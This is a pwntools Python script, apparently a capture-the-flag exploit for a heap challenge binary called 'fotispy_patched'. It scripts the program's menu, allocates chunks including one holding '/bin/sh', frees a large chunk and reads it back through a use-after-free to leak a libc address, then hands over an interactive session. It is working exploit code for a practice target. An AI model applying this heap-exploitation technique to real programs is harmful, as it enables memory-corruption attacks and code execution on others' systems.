#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or 'fotispy_patched')
context.terminal = ['wt.exe','wsl.exe']
def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())


p = start()
def m(n): p.sendlineafter(b'[~] Choice: ',str(n).encode())

def add(size,isi):
    m(2)
    p.sendlineafter(b'will the comment be: ',str(size).encode())
    p.sendlineafter(b'Enter the comment: ',isi)

def edit(idx,isi):
    m(3)
    p.sendlineafter(b'song to you want to select: ',str(idx).encode())
    p.sendlineafter(b'long will the new comment be: ',isi)

def view(idx):
    m(4)
    p.sendlineafter(b'song to you want to select: ',str(idx).encode())

def delete(idx):
    m(5)
    p.sendlineafter(b'song to you want to select: ',str(idx).encode())

m(1)
p.sendlineafter(b'Username: ',b'a')
p.sendlineafter(b'Password: ',b'a')

add(0x420, b"cc")  # 0
add(0xF0, b"cc")
add(0xF0, b"cc")
add(0xF0, b"/bin/sh\x00")
delete(0)
view(0)
p.recvuntil(b'[+] Here is your comment:\n')
leak = u64(p.recv(6).ljust(8,b'\x00'))
print(hex(leak))


p.interactive()